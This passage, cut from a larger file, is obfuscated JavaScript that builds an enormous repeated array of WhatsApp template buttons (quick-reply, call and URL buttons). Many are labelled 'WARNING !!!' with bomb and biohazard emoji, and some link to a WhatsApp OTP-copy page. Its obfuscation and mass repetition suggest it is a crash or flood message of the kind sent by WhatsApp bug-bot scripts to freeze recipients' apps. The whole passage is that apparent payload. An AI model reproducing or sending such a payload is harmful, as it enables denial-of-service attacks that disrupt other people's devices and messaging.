/www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),